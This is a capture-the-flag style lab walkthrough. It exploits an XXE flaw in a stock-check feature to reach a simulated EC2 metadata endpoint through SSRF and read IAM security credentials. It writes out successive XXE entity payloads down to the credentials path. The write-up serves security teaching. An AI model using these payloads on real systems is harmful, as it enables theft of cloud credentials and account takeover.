# Lab: Exploiting XXE to perform SSRF attacks

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

# Step 1 Walk the application

I find that the the /product/stock page is using XML

![image](https://user-images.githubusercontent.com/83407557/210181558-a8dd22ab-b087-480e-9930-eedd13504826.png)

# Step 2 attempt XXE

I want to use the following XXE payload to try and reach the EC2 metadata endpoint by sending the found page to repeater

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

And then test each parameter with `&xxe;`

**productId**

![image](https://user-images.githubusercontent.com/83407557/210181648-fc454941-5edd-405e-9d0e-407949e4dd1a.png)

# Step 3 adding to payload

I see that it returns latest, so I add that to the payload:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```

![image](https://user-images.githubusercontent.com/83407557/210181741-467e4036-7ec4-4275-8cd8-b25773f71a10.png)

# Step 4 adding to payload

repeating the process I add meta-data to payload

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
```
![image](https://user-images.githubusercontent.com/83407557/210181781-55294e6e-781a-49ec-b44e-b5e7f82890c1.png)

# Step 5 adding to payload


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
```

![image](https://user-images.githubusercontent.com/83407557/210181794-e4437c6b-c2b0-47ff-88d5-dc557dea2cf1.png)

# Step 6 adding to payload


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
```

![image](https://user-images.githubusercontent.com/83407557/210181824-62e39f0b-8d1b-491f-a879-237943f9493f.png)

# Step 7 adding to payload


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```
With this I cred the account id, secret key, and session token for this AWS instance:

![image](https://user-images.githubusercontent.com/83407557/210181878-1fc9892f-e36c-458c-9521-442dfb232ffa.png)

Finding these credentials I solve the lab:

![image](https://user-images.githubusercontent.com/83407557/210181892-c367dcc7-240d-4a5c-ae42-9a852c5649ec.png)
